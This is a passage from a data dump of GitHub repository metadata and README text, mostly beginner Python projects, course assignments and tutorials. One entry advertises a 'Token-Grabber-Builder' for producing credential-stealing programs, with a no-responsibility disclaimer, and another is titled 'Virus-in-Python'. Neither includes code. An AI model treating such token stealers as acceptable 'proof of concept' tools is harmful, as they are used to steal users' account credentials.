the coffee machine are complaining that there is often shortages of water and/or milk. It takes weeks before the machine is refilled. Your product owner wants to you to take advantage of the machine capabilities to inform the user that there is a shortage and to send a email notification to the company so that they can come and refill the machine. Use cases When I order a drink and it can be delivered because of a shortage, I want to see a message to the coffee machine console that indicates me the shortage and that a notification has been sent Implementation details You can take advantages of the 2 services implemented by the coffee machine: public interface EmailNotifier {     void notifyMissingDrink(String drink) }  public interface BeverageQuantityChecker {     boolean isEmpty(String drink) }  "
417837779;hang-game-in-python;https://github.com/ashwin-hith/hang-game-in-python;;2021-10-16T13:33:54Z;0;0;0;hang-game-in-python 
417829314;python-argparse-sample;https://github.com/kumarstack55/python-argparse-sample;Python;2021-10-16T13:00:22Z;0;0;0;python-argparse-sample argparse の機能を試すサンプルプログラムです。 テストするには？ python -munittest discover tests 
417832101;Python-For-Everybody-Assignments;https://github.com/Dummy-ken/Python-For-Everybody-Assignments;;2021-10-16T13:11:06Z;0;0;0;
417806766;AutoStuffWithPython;https://github.com/hyperpc/AutoStuffWithPython;Python;2021-10-16T11:25:44Z;0;0;0;Python编程快速上手 --让繁琐工作自动化 Automate the boring stuff with python  下载和安装Python 本书使用的版本是Python 3 适用于Windows和OS X的版本可以手动双击安装。 下面举例Ubuntu的命令行安装：  sudo apt-get install python3 sudo apt-get install idle3 sudo apt-get install python3-pip Applications > Accessories > Terminal: idles or Application > Programming > IDLE 3  推荐论坛： Stack Overflow learnprogramming subreddit 作者：Al Sweigart 网站：http://www.inventwithpython.com/ 博客：http://www.inventwithpython.com/blog/ 邮件：al@inventwithpython.com 配置Visual Studio Code 在Visual Studio Code的扩展面板搜索‘Python’，点击安装 检查是否关联到Python编译器： 在VS Code的终端面板，切换到命令提示符模式， 输入命令‘Python --version’，如果能正确输出上面安装的Python版本，则成功； 否则，请重启VS Code，然后再输入以上命令，看是否成功。 
417787483;Python_All_In_One;https://github.com/syedarfa459/Python_All_In_One;Python;2021-10-16T10:01:08Z;0;0;0;
417872326;Python-Guess-Game;https://github.com/BatOrgil0905/Python-Guess-Game;Python;2021-10-16T15:42:31Z;0;0;0;
417791033;gesture_volume_control_python;https://github.com/SajawalHassan/gesture_volume_control_python;Python;2021-10-16T10:15:17Z;0;0;1;"      Gesture Volume Control      A volome controller to controll a device volume with you hands!      Report Bug     ·     Request Feature    Table of Contents   About The Project  Built With How it works    Getting Started  Prerequisites Installation   Contributing   About The Project This is a mediapipe, opencv and python project which are some great if not best programming/packeges for computer vision. This project is opensourced so you can add amazing features more on that here back to top Built With This project is built with mediapipe, opencv and python the links to their documentation are listed below  python open-cv mediapipe  back to top How it works This project uses mediapipe as the algorithm to detect hands  Detect the hands which then returns 21 landmarks  Here is the list of landmarks it returns:    """"""The 21 hand landmarks.""""""    WRIST = 0    THUMB_CMC = 1    THUMB_MCP = 2    THUMB_IP = 3    THUMB_TIP = 4    INDEX_FINGER_MCP = 5    INDEX_FINGER_PIP = 6    INDEX_FINGER_DIP = 7    INDEX_FINGER_TIP = 8    MIDDLE_FINGER_MCP = 9    MIDDLE_FINGER_PIP = 10    MIDDLE_FINGER_DIP = 11    MIDDLE_FINGER_TIP = 12    RING_FINGER_MCP = 13    RING_FINGER_PIP = 14    RING_FINGER_DIP = 15    RING_FINGER_TIP = 16    PINKY_MCP = 17    PINKY_PIP = 18    PINKY_DIP = 19    PINKY_TIP = 20  draw a circle on the THUMB_TIP and the INDEX_FINGER_TIP and a line between them  # Drawing circle on thumb and index finger cv.circle(img, pointA, 10, (255, 0, 0), -1) cv.circle(img, pointB, 10, (255, 0, 0), -1)  # Drawing line between them cv.line(img, (x1, y1), (x2, y2), (255, 0, 0), 2)  calculate the distance between point a and point b via the coordinates of the thumb and minusing its coordinates with the index finger coordinates  lenght = math.hypot(x1 - x2, y1 - y2) And finally i set the master volume to the lenght call([""amixer"", ""-D"", ""pulse"", ""sset"", ""Master"", f""{lenght_percentage}%""]) back to top Getting Started To get a local copy up and running follow these simple example steps. Prerequisites Here are some of the prerequisites you need to work with the project  python opencv mediapipe # You don't need this one but its reccomended in case you want to add things to the module  Installation   python   mediapipe pip install mediapipe   open-cv pip install opencv-python   back to top Contributing Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are greatly appreciated. If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag ""enhancement"". Don't forget to give the project a star! Thanks again!  Fork the Project Create your Feature Branch (git checkout -b feature/AmazingFeature) Commit your Changes (git commit -m 'Add some AmazingFeature') Push to the Branch (git push origin feature/AmazingFeature) Open a Pull Request  back to top "
417775882;Google_colab_python;https://github.com/jshrma14/Google_colab_python;Jupyter Notebook;2021-10-16T09:11:44Z;0;0;0;Google_colab_python All the practice files from google colab will be saved here. 
417783991;latihan_python_dua;https://github.com/fahmihidayah/latihan_python_dua;Python;2021-10-16T09:47:09Z;0;0;0;
417782841;Project-1-Python;https://github.com/miezazhar/Project-1-Python;Jupyter Notebook;2021-10-16T09:42:10Z;0;0;0;
417777187;python-srs-tkinter-project;https://github.com/hackergod00001/python-srs-tkinter-project;Python;2021-10-16T09:18:01Z;0;0;0;
417839928;Data_Analysis_with_Python;https://github.com/sachingk08/Data_Analysis_with_Python;Jupyter Notebook;2021-10-16T13:42:50Z;0;0;0;Data_Analysis_with_Python Coursera Data analysis with ython 
417828213;Python-convert-to-negative;https://github.com/isaccanedo/Python-convert-to-negative;Python;2021-10-16T12:55:42Z;0;0;0;Python-convert-to-negative 🏁 Implementado um algoritmo usando opencv para converter uma imagem colorida em seu negativo 
417828748;Virus-in-Python;https://github.com/AdityaGurjale2002/Virus-in-Python;Python;2021-10-16T12:57:58Z;0;0;0;Virus-in-Python 
417790154;Python-Basic-Assignments;https://github.com/mansibh24/Python-Basic-Assignments;Jupyter Notebook;2021-10-16T10:11:07Z;0;0;0;
417785677;sawo_labs_with_python;https://github.com/Shikhar0708/sawo_labs_with_python;HTML;2021-10-16T09:54:00Z;0;0;0;
417807160;Python-Programmer15;https://github.com/Python-Programmer15/Python-Programmer15;;2021-10-16T11:27:19Z;0;0;0; 👋 Hi, I’m @Python-Programmer15 👀 I’m interested in ... 🌱 I’m currently learning ... 💞️ I’m looking to collaborate on ... 📫 How to reach me ...  
417811245;jetbrains_python_first;https://github.com/adarsh100rao/jetbrains_python_first;;2021-10-16T11:45:13Z;0;0;0;jetbrains_python_first 
417868623;Automation_In_Python;https://github.com/sivaramakrishnan1/Automation_In_Python;Python;2021-10-16T15:28:13Z;0;0;0;Automation_In_Python Some Automation methods in Python. This repository have some programs that can send WhatsApp messages to the list of contacts that is passed as input. 
417868301;MapReduce-avec-Python;https://github.com/dmweiwei/MapReduce-avec-Python;Python;2021-10-16T15:26:56Z;0;0;0;
417870603;Python-Data-Structures-Algorithms;https://github.com/irnmn/Python-Data-Structures-Algorithms;Python;2021-10-16T15:35:39Z;0;0;0;
417863827;python-G5XSKw;https://github.com/tryspidy/python-G5XSKw;Python;2021-10-16T15:10:16Z;0;0;0;
417798035;python_vndb_parser;https://github.com/wtrghux/python_vndb_parser;Python;2021-10-16T10:48:28Z;0;0;0;python_vndb_parser Парсер результатов поиска с сайта визуальных новелл. Выводит результаты в таблцу. При двойном клике открывает страницу тайтла в браузере.  
417861995;Python-CLI-Vault;https://github.com/saikatsahana77/Python-CLI-Vault;Python;2021-10-16T15:03:37Z;0;0;0;Python Vault CLI  A CLI vault to store all your secrets :)  Usage Instructions :  Download the contents of The Repository as a Zip File or clone the Repository. Install Python in your Machine Run the safe.py file by running python safe.py or python3 safe.py on it. Then add your spare username and email from which you want to send the emails to your own email if you want to reset the password (on line numbers 202 and 204 in the safe.py file). Make sure to allow access of using less secure apps in that particular email. Check the tutorial here: https://hotter.io/docs/email-accounts/secure-app-gmail/ Finally follow the video below to understand how this vault works.  [NOTE: DON'T EVER DELETE ANY PREXISTING FILES OR CREATED FILES/FOLDERS OR THE APP MIGHT STOP WORKING!]    Author Info :  Youtube - Tech Rack Twitter - @sahana_saikat Website - Tech Rack Facebook - Saikat Sahana Instagram - saikat2811 LinkedIn - Saikat Sahana Github - saikatsahana77  
417776072;Python-learning-by-myself;https://github.com/Southsky7/Python-learning-by-myself;;2021-10-16T09:12:37Z;0;0;0;
417868078;Python_Intro_Project;https://github.com/qwang27/Python_Intro_Project;Jupyter Notebook;2021-10-16T15:26:06Z;0;0;0;Python_Intro_Project This is a project of data exploratory analysis using python while I am a fellow at the NYC Data Science Academy. In this project I explore the contents of the steaming service Disney +, and I discuss its developing business strategy as well as its competitive edge against Netflix. 
417782951;datacake-python-example;https://github.com/datacake/datacake-python-example;;2021-10-16T09:42:42Z;0;0;0;
417772131;Python-Deep-Learning;https://github.com/luodiw/Python-Deep-Learning;;2021-10-16T08:56:20Z;0;0;0;
417836558;Python-Scripts-Projects;https://github.com/Magdyedwar1996/Python-Scripts-Projects;;2021-10-16T13:28:56Z;0;0;0;Python-Scripts-Projects This simple repository contains some different projects and scripts done through courses and through some work and tasks that I did while freelancing using python language 
417831261;python_lesson_5;https://github.com/meliudas/python_lesson_5;;2021-10-16T13:07:51Z;0;0;0;
417831767;python-2021-2022;https://github.com/makerlabworkshop/python-2021-2022;Python;2021-10-16T13:09:50Z;0;0;0;python-2021-2022 
417804307;python-random-quote;https://github.com/Samvegas/python-random-quote;Python;2021-10-16T11:14:54Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417846858;python-tkinter-practice;https://github.com/muzudho/python-tkinter-practice;Python;2021-10-16T14:10:06Z;0;0;0;python-tkinter-practice Python の tkinter というGUIの練習 Run python.exe main.py # または main.py Documents 📖 PythonのTkinterを使ってみる 📖 【Python】テキストボックス(Tkinter.Entry)の作成・出力・入力 📖 Tkinter、Textウィジェットの使い方 📖 【Python】tkinterのplace()を使ってウィジェットを配置する！ 📖 【Python tkinter】ドロップダウンリスト（プルダウン）を表示：Comboboxウィジェット 📖 How can I create a dropdown menu from a List in Tkinter? 📖 Tkinter Button 📖 Python/Tkinter: How to set text widget contents to the value of a variable? 
417855072;My_Python_codes;https://github.com/aditya5472/My_Python_codes;;2021-10-16T14:38:11Z;0;0;0;
417832931;python-messages-to-slack;https://github.com/naguer/python-messages-to-slack;;2021-10-16T13:14:16Z;0;0;0;python-messages-to-slack Send messages to a Slack channel using python 
417844079;python-freecodecamp-challenges;https://github.com/codinglayla/python-freecodecamp-challenges;Python;2021-10-16T14:00:12Z;0;0;0;python-freecodecamp-projects 
417832353;Daemon-in-Python;https://github.com/AdityaGurjale2002/Daemon-in-Python;Python;2021-10-16T13:12:10Z;0;0;0;
417822525;Python-set-operations;https://github.com/DarkDevil99/Python-set-operations;Python;2021-10-16T12:32:28Z;0;0;0;
417861466;open-alethia-python;https://github.com/open-alethia/open-alethia-python;Python;2021-10-16T15:01:57Z;0;0;0;
417809530;python--logical-operators;https://github.com/MHS-crypto/python--logical-operators;Jupyter Notebook;2021-10-16T11:37:47Z;0;0;0;
417847777;Qrcode_generator_in_python;https://github.com/kruthik-nivas/Qrcode_generator_in_python;Python;2021-10-16T14:13:25Z;0;0;0;Qrcode_generator_in_python This python program will get a input from user to create a qr code with the data what user want and in retun it gives a file in same dierectory names as test.png 
417836746;python-random-quote;https://github.com/Suman-Mukherje/python-random-quote;Python;2021-10-16T13:29:50Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417851802;astrologer-s-star-python-;https://github.com/ASJADSYED08/astrologer-s-star-python-;Python;2021-10-16T14:26:27Z;0;0;0;
417849911;1pythonProject;https://github.com/DANTECK-dev/1pythonProject;Python;2021-10-16T14:20:14Z;0;0;0;
417819194;python-datacake-mqtt-example;https://github.com/datacake/python-datacake-mqtt-example;Python;2021-10-16T12:18:00Z;0;0;0;Python 2 Datacake - Internal MQTT Example This example shows you how you can use Paho MQTT Package to write Data to Datacake using its internal MQTT Broker 
417857279;python-api-challenge;https://github.com/VectorReaves/python-api-challenge;Python;2021-10-16T14:46:22Z;0;0;0;"Python API Homework - What's the Weather Like? Background Whether financial, political, or social -- data's true power lies in its ability to answer questions definitively. So let's take what you've learned about Python requests, APIs, and JSON traversals to answer a fundamental question: ""What's the weather like as we approach the equator?"" Now, we know what you may be thinking: ""Duh. It gets hotter..."" But, if pressed, how would you prove it?  Before You Begin   Create a new repository for this project called python-api-challenge. Do not add this homework to an existing repository.   Clone the new repository to your computer.   Inside the repository folder you just created, add new files called WeatherPy.ipynb and VacationPy.ipynb. These will be the main scripts to run for each analysis.   Push the above changes to GitHub.   Adding A .gitignore File We don't want the api_keys.py file containing the API key to be exposed to the public on GitHub, as this would mean anyone could copy and use our API key, possibly causing us to incur charges. When we type git status in the command line, we can see all the files we have created so far that are untracked. If we only wanted to add the WeatherPy.ipynb file to GitHub we could type git add WeatherPy.ipynb. However, every time we want to add a new file or update current files to the repository, we have to add each file individually, which is time-consuming and cumbersome. Instead, we can add the files we don't want to track to the .gitignore file. Before we add our files to GitHub, let's add api_keys.py to the .gitignore file. Follow these steps:   Open your python-api-challenge GitHub folder in VS Code.   Open the .gitignore file, and on the first line type the following:   # Adding config.py file. api_keys.py   While the .gitignore file is open, add the API_practice.ipynb and random_numbers.ipynb files and save the file.   In the command line, type git status and press Enter. The output should say the .gitignore file has been modified and the WeatherPy.ipynb file is untracked.   Use git add, git commit, and git push to commit the modifications to .gitignore and the WeatherPy.ipynb file to GitHub.   On GitHub, the only new file you should see is the WeatherPy.ipynb file. Part I - WeatherPy In this example, you'll be creating a Python script to visualize the weather of 500+ cities across the world of varying distance from the equator. To accomplish this, you'll be utilizing a simple Python library, the OpenWeatherMap API, and a little common sense to create a representative model of weather across world cities. The first requirement is to create a series of scatter plots to showcase the following relationships:  Temperature (F) vs. Latitude Humidity (%) vs. Latitude Cloudiness (%) vs. Latitude Wind Speed (mph) vs. Latitude  After each plot, add a sentence or two explaining what the code is analyzing. The second requirement is to run linear regression on each relationship. This time, separate the plots into Northern Hemisphere (greater than or equal to 0 degrees latitude) and Southern Hemisphere (less than 0 degrees latitude):  Northern Hemisphere - Temperature (F) vs. Latitude Southern Hemisphere - Temperature (F) vs. Latitude Northern Hemisphere - Humidity (%) vs. Latitude Southern Hemisphere - Humidity (%) vs. Latitude Northern Hemisphere - Cloudiness (%) vs. Latitude Southern Hemisphere - Cloudiness (%) vs. Latitude Northern Hemisphere - Wind Speed (mph) vs. Latitude Southern Hemisphere - Wind Speed (mph) vs. Latitude  After each pair of plots, take the time to explain what the linear regression is modeling. For example, describe any relationships you notice and any other analysis you may have. Your final notebook must:  Randomly select at least 500 unique (non-repeat) cities based on latitude and longitude. Perform a weather check on each of the cities using a series of successive API calls. Include a print log of each city as it's being processed with the city number and city name. Save a CSV of all retrieved data and a PNG image for each scatter plot.  Part II - VacationPy Now let's use your skills in working with weather data to plan future vacations. Use jupyter-gmaps and the Google Places API for this part of the assignment.   Note: Remember that any API usage beyond the $200 credit will be charged to your personal account. You can set quotas and limits to your daily requests to be sure you can't be charged. Check out Google Maps Platform Billing and Manage your cost of use for more information.   Note: if you having trouble displaying the maps, try running jupyter nbextension enable --py gmaps in your environment and retry.   To complete this part of the assignment,you will need to do the following:   Create a heat map that displays the humidity for every city from Part I.    Narrow down the DataFrame to find your ideal weather condition. For example:   A max temperature lower than 80 degrees but higher than 70.   Wind speed less than 10 mph.   Zero cloudiness.   Drop any rows that don't contain all three conditions. You want to be sure the weather is ideal.   Note: Feel free to adjust to your specifications but be sure to limit the number of rows returned by your API requests to a reasonable number.     Using Google Places API to find the first hotel for each city located within 5000 meters of your coordinates.   Plot the hotels on top of the humidity heatmap with each pin containing the Hotel Name, City, and Country.    As final considerations:  You must complete your analysis using a Jupyter notebook. You must use the Matplotlib or Pandas plotting libraries. For Part I, you must include a written description of three observable trends based on the data. For Part II, you must include a screenshot of the heatmap you create and include it in your submission. You must use proper labeling of your plots, including aspects like: Plot Titles (with date of analysis) and Axes Labels. For max intensity in the heat map, try setting it to the highest humidity found in the data set.  Hints and Considerations   The city data you generate is based on random coordinates as well as different query times. As such, your outputs will not be an exact match to the provided starter notebook.   If you'd like a refresher on the geographic coordinate system, this site has great information.   Next, spend the requisite time necessary to study the OpenWeatherMap API. Based on your initial study, you should be able to answer basic questions about the API: Where do you request the API key? Which Weather API in particular will you need? What URL endpoints does it expect? What JSON structure does it respond with? Before you write a line of code, you should be aiming to have a crystal clear understanding of your intended outcome.   A starter code for Citipy has been provided. However, if you're craving an extra challenge, push yourself to learn how it works: citipy Python library. Before you try to incorporate the library into your analysis, start by creating simple test cases outside your main script to confirm that you are using it correctly. Too often, when introduced to a new library, students get bogged down by the most minor of errors -- spending hours investigating their entire code -- when, in fact, a simple and focused test would have shown their basic utilization of the library was wrong from the start. Don't let this be you!   Part of our expectation in this challenge is that you will use critical thinking skills to understand how and why we're recommending the tools we are. What is Citipy for? Why would you use it in conjunction with the OpenWeatherMap API? How would you do so?   In building your script, pay attention to the cities you are using in your query pool. Are you getting coverage of the full gamut of latitudes and longitudes? Or are you simply choosing 500 cities concentrated in one region of the world? Even if you were a geographic genius, simply rattling 500 cities based on your human selection would create a biased dataset. Be thinking of how you should counter this. (Hint: Consider the full range of latitudes).   Once you have computed the linear regression for one chart, the process will be similar for all others. As a bonus, try to create a function that will create these charts based on different parameters.   Remember that each coordinate will trigger a separate call to the Google API. If you're creating your own criteria to plan your vacation, try to reduce the results in your DataFrame to 10 or fewer cities.   Ensure your repository has regular commits and a thorough README.md file.   Lastly, remember -- this is a challenging activity. Push yourself! If you complete this task, then you can safely say that you've gained a strong mastery of the core foundations of data analytics and it will only go better from here. Good luck!   Rubric Unit 6 Rubric - Python API Homework - What's the Weather Like?  © 2021 Trilogy Education Services, LLC, a 2U, Inc. brand. Confidential and Proprietary. All Rights Reserved. "
417780787;subaru-ssm-python;https://github.com/james-portman/subaru-ssm-python;Python;2021-10-16T09:33:45Z;0;0;0;
417843287;Prueba1;https://github.com/jucerocast/Prueba1;;2021-10-16T13:56:56Z;0;0;0;Prueba1 Prueba Python 
417834324;mat1-kod1-h3;https://github.com/Aysegul50/mat1-kod1-h3;;2021-10-16T13:19:33Z;0;0;0;mat1-kod1-h3 python kod 
417863321;Projeto_inicial_phyton;https://github.com/MottaHenrique/Projeto_inicial_phyton;;2021-10-16T15:08:32Z;0;0;0;Projeto_inicial_phyton Projetos_Python 
417790431;Pyth-5;https://github.com/flikyy/Pyth-5;;2021-10-16T10:12:27Z;0;0;0;
417762868;slitherySnake;https://github.com/yuntianNUS/slitherySnake;Python;2021-10-16T08:11:42Z;0;0;0;slitherySnake Tic Tac Toe: An AI python game application that has an unbeatable AI in TicTacToe Alice and Bob: Mimicing UDP clients sending and receiving messeages through a router Webserver: A python application that mimics a TCP web server 
417760790;TuRKEy;https://github.com/T7urkey/TuRKEy;;2021-10-16T08:03:01Z;0;0;0;
417840874;py.Analys;https://github.com/Athenaazar/py.Analys;HTML;2021-10-16T13:46:42Z;0;0;0;py.Analys Python Analys 
417820871;EdYoda-Final-Python-Project;https://github.com/mradityaroy/EdYoda-Final-Python-Project;Python;2021-10-16T12:25:43Z;0;0;0;
417876108;data_analysis_with_python_pandas;https://github.com/CodingWithLaura/data_analysis_with_python_pandas;Python;2021-10-16T15:57:36Z;0;0;0;
417876677;TASK-2-ADVANCE-PYTHON-PROGRAM-;https://github.com/mrcomet/TASK-2-ADVANCE-PYTHON-PROGRAM-;;2021-10-16T15:59:59Z;0;0;0;TASK-2-ADVANCE-PYTHON-PROGRAM- 
417838811;Invent-computer-games-with-python;https://github.com/Richard-JWE/Invent-computer-games-with-python;Python;2021-10-16T13:38:04Z;0;0;0;
417857606;punch-paper-scissor-game-python;https://github.com/ASJADSYED08/punch-paper-scissor-game-python;Python;2021-10-16T14:47:38Z;0;0;0;
417856695;Tetris-in-python-without-pygame;https://github.com/malekpe/Tetris-in-python-without-pygame;Python;2021-10-16T14:44:18Z;1;1;0;
417833589;python-kurs-wise21_22;https://github.com/morpfl/python-kurs-wise21_22;;2021-10-16T13:16:43Z;0;0;0;Python Course - winter semester 2021/22 Welcome! In this repo you will find all necessary information, the slides, and exercises as well as solutions.          date Wednesday, 9:20 - 10:50   room APB-E007   Eric Niklas Wolf eric_niklas.wolf@mailbox.tu-dresden.de   Moritz Pflügner moritz.pfluegner@mailbox.tu-dresden.de    
417829211;Python-test-digital-image-processing;https://github.com/isaccanedo/Python-test-digital-image-processing;Python;2021-10-16T12:59:53Z;0;0;0;Python-test-digital-image-processing 🌄 PyTest's para processamento digital de imagens 
417795507;Python-from-Basics-to-Intermediate;https://github.com/manisha841/Python-from-Basics-to-Intermediate;Jupyter Notebook;2021-10-16T10:36:00Z;0;0;0;Python-from-Basics-to-Intermediate 
417805491;Kaggle_Articles_Final_Python_Part;https://github.com/shivjain123/Kaggle_Articles_Final_Python_Part;Python;2021-10-16T11:20:04Z;0;0;0;Kaggle_Articles_Final_Python_Part 
417809689;Contact-Managment-System-using-Python;https://github.com/Namrata-Lokhande/Contact-Managment-System-using-Python;Python;2021-10-16T11:38:33Z;1;1;0;
417860426;Test_task_python_DocuSketch;https://github.com/Ruselbyru/Test_task_python_DocuSketch;Jupyter Notebook;2021-10-16T14:58:08Z;0;0;0;
417816708;back-end_Python_vk_education;https://github.com/popo1206/back-end_Python_vk_education;;2021-10-16T12:07:40Z;0;0;0;back-end_Python_vk_education 
417819525;travelling-django-project-using-python;https://github.com/Raoshan/travelling-django-project-using-python;;2021-10-16T12:19:39Z;0;0;0;
417844747;GelismisBedenKitleEndeksi-Python;https://github.com/sercanefe/GelismisBedenKitleEndeksi-Python;Python;2021-10-16T14:02:14Z;1;1;0;
417876932;Python-2---Module1-HW;https://github.com/SteveW011684/Python-2---Module1-HW;Jupyter Notebook;2021-10-16T16:00:52Z;0;0;0;
417806756;SeleniumPython-AlertBox-Testing;https://github.com/jaygandhi129/SeleniumPython-AlertBox-Testing;Python;2021-10-16T11:25:40Z;0;0;0;
417801354;Image_steganography_project_using_python;https://github.com/RakeshYadavCoder/Image_steganography_project_using_python;;2021-10-16T11:01:55Z;0;0;0;
417852695;a-simple-class-in-python;https://github.com/MrTechHunter/a-simple-class-in-python;Python;2021-10-16T14:29:27Z;0;0;0;
417869177;python_learning_course_2021-2022;https://github.com/KD-TrendOn/python_learning_course_2021-2022;;2021-10-16T15:30:16Z;0;0;0;
417793079;Python-Game-using-Turtle-Graphics;https://github.com/Subrat2006/Python-Game-using-Turtle-Graphics;Python;2021-10-16T10:24:42Z;0;0;0;Python Game using Turtle Graphics This is my Project (for school's evaluation). Description of the Project: In this project, I have made a game on Python using Turtle Graphics. In this game, we need to choose the no of sticks from the left side, and then the computer would also choose the number of sticks and remove it (it will do the same from right). The one, who removed the last stick wins. Requirements:  Python IDLE (any version). Visual Studio Code by Microsoft (You can use any other IDLE too, but I recommend to use this one)  Codes: You can get the codes of the project here. Some glimpses of the project: You can get the glimpse of the Project here:  
417824661;E-Mail-Handling-in-Python;https://github.com/UweZiegenhagen/E-Mail-Handling-in-Python;;2021-10-16T12:41:18Z;0;0;0;E-Mail-Handling-in-Python Materialien für meinen Vortrag bei der PyDD am 27.10.2021 
417803477;Site-Data-Scraping-with-Python;https://github.com/maruf897/Site-Data-Scraping-with-Python;;2021-10-16T11:10:52Z;0;0;0;
417829605;Intro-Computer-Vision;https://github.com/katymq/Intro-Computer-Vision;Jupyter Notebook;2021-10-16T13:01:29Z;0;0;3;
417778079;first-graphics;https://github.com/gitpegasis/first-graphics;Python;2021-10-16T09:21:57Z;0;0;0;first-graphics Python Graphics is used 
417869938;Tradutor;https://github.com/fawkesnypo/Tradutor;Python;2021-10-16T15:33:11Z;0;0;0;Tradutor Tradutor feito em python A tradução das palavras é feita utilizando a bilioteca googletrans A interface gráfica é feita com interface com pysimplegui 
417800732;SecondProject;https://github.com/Scalas/SecondProject;Python;2021-10-16T11:00:00Z;0;0;0;
417824373;twopasswords;https://github.com/gennadis/twopasswords;Python;2021-10-16T12:40:09Z;0;0;0;
417863980;brunoyam;https://github.com/lanaria5/brunoyam;Jupyter Notebook;2021-10-16T15:10:53Z;0;0;0;
417852004;VK;https://github.com/Vlatteran/VK;Python;2021-10-16T14:27:10Z;0;0;0;
417770890;MachineLearning;https://github.com/FermainPariz/MachineLearning;;2021-10-16T08:50:21Z;0;0;0;MachineLearning MachineLearning with Python 
417840112;SinNombre;https://github.com/almuhs02/SinNombre;;2021-10-16T13:43:38Z;0;0;0;
417807070;algorithim_for_modified_nodal_analysis;https://github.com/sajinshaji-017/algorithim_for_modified_nodal_analysis;Python;2021-10-16T11:26:59Z;0;0;0;
417831044;string-formatter;https://github.com/dopamine-w/string-formatter;Python;2021-10-16T13:06:51Z;0;0;0;string-formatter String formatter in python that I made for fun I know it's probably shit but we will have to do with this for now 
417766945;Token-Grabber-Builder;https://github.com/ccxmIcal/Token-Grabber-Builder;Python;2021-10-16T08:30:58Z;0;0;0;"Token-Grabber-Builder Python token grabber builder Legal It is not my responsability what you guys do with this file. It is just a proof of concept! Info  The icon is glitchy i will fix it in the future. The token grabber will be exported in in the folder ""GrabberOut""  "
417856109;Data_Structures;https://github.com/KnockOut0101/Data_Structures;Python;2021-10-16T14:42:04Z;0;0;0;Data_Structures Data Structures Practice(Python) 
417786881;DATA_SCIENCE_TASK0_04;https://github.com/Ganesh-98/DATA_SCIENCE_TASK0_04;;2021-10-16T09:58:49Z;0;0;0;DATA_SCIENCE_TASK_04 DATA SCIENCE USING PYTHON 
417863828;Code-of-CS61a;https://github.com/yuhuanyuan/Code-of-CS61a;;2021-10-16T15:10:16Z;0;0;0;
417825076;PQL;https://github.com/zal-byte/PQL;Python;2021-10-16T12:43:03Z;0;0;0;
417845614;BlackJack;https://github.com/amit0693/BlackJack;Python;2021-10-16T14:05:34Z;0;0;0;
417830220;weather;https://github.com/SHAYON2003/weather;;2021-10-16T13:03:24Z;0;0;0;
417773255;anonypy;https://github.com/glassonion1/anonypy;Python;2021-10-16T09:01:02Z;0;0;0;AnonyPy Anonymization library for python Install $ pip install anonypy  Usage import anonypy import pandas as pd  def main():     path = 'data/adult.test.txt'     df = pd.read_csv(path, sep=', ', names=names, engine='python')      for name in categorical:         df[name] = df[name].astype('category')      feature_columns = ['age', 'education-num']     m = anonypy.Mondrian(df, feature_columns)     partitions = m.partition(anonypy.is_k_anonymous)     print(partitions) 
417843029;AL_Programming_w_Python_Nanodegree-pretrained;https://github.com/MaryamHaghdoust1998/AL_Programming_w_Python_Nanodegree-pretrained;Python;2021-10-16T13:55:50Z;0;0;0;
417873370;Python_Crash_Course-2nd-Edition-Solutions-;https://github.com/anandrex5/Python_Crash_Course-2nd-Edition-Solutions-;;2021-10-16T15:46:34Z;0;0;0;Python_Crash_Course-2nd-Edition-Solutions- 
417877315;Build-Recommendation-System-in-python-using-ML;https://github.com/imnu13/Build-Recommendation-System-in-python-using-ML;Jupyter Notebook;2021-10-16T16:01:51Z;0;0;0;Build-Recommendation-System-in-python-using-ML  What is recommendation system? Humongous amounts of video content getting generated on a daily basis by organization, analyzing them is one of the biggest challenges. We need to build a content recommendation engine with user’s viewing history and preferences. This will simplify content discovery for your users and guide them to the most relevant content that they want which in return saves organization time to analyse the popular/best videos. Machine Learning algorithm used is NLP and TFID. HTML and CSS is used to design the page. Deployment Deployed the model in streamlit. As this is easy platform to deploy the model. To search the videos we exrtracted some keywords, if user search a video using keywords video will appear. And user will get some recommedation related user's searched videos. Some variable had special characters and emoticons, we clean the data removed special characters and emoticons, using feature selection can reduce unnecessary variables from the dataset. So we created keyword variable as a target variable. 
417835214;python-file-exists-jZ186n;https://github.com/tryspidy/python-file-exists-jZ186n;;2021-10-16T13:23:23Z;0;0;0;
417842951;uva-and-codeforces-problem-solving-using-python;https://github.com/Nahidjc/uva-and-codeforces-problem-solving-using-python;Python;2021-10-16T13:55:37Z;0;0;0;
417873210;Bulk-Email-Generator-Using-GUI-Python;https://github.com/Pruthviraj7/Bulk-Email-Generator-Using-GUI-Python;Python;2021-10-16T15:45:55Z;0;0;0;
417824536;Data-Science-in-Python-Assignment-Solution-Coursera;https://github.com/shafiul-haque-johny/Data-Science-in-Python-Assignment-Solution-Coursera;Python;2021-10-16T12:40:47Z;1;1;0;Data-Science-in-Python-Assignment-Solution-Coursera 
417779044;Python_Program_Competition_2021.10.16;https://github.com/Andy87877/Python_Program_Competition_2021.10.16;;2021-10-16T09:26:18Z;0;0;0;第一題  第二題 輸入頭尾，頭尾中間的所有偶數相加（包含頭尾） 第三題 求四分位距 第四題 頻率最高的五個字母 第五題 面積 
417796845;calculator-in-15-lines-of-python;https://github.com/mulham-python/calculator-in-15-lines-of-python;;2021-10-16T10:42:55Z;0;0;0;
417816206;211016---BAEKJUN-4-2-with-Python;https://github.com/Readrive/211016---BAEKJUN-4-2-with-Python;Python;2021-10-16T12:05:53Z;0;0;0;
417865832;Statistical-Mechanics-of-Complex-Systems-Python;https://github.com/davidemaniscalco/Statistical-Mechanics-of-Complex-Systems-Python;Jupyter Notebook;2021-10-16T15:17:33Z;0;0;0;Statistical-Mechanics-of-Complex-Systems-Python Exercises done during the course of Statistical mechanics of complex systems from the master degree in Physics of Data 
417857577;online-python-compiler-Oy9L47;https://github.com/tryspidy/online-python-compiler-Oy9L47;Python;2021-10-16T14:47:33Z;0;0;0;
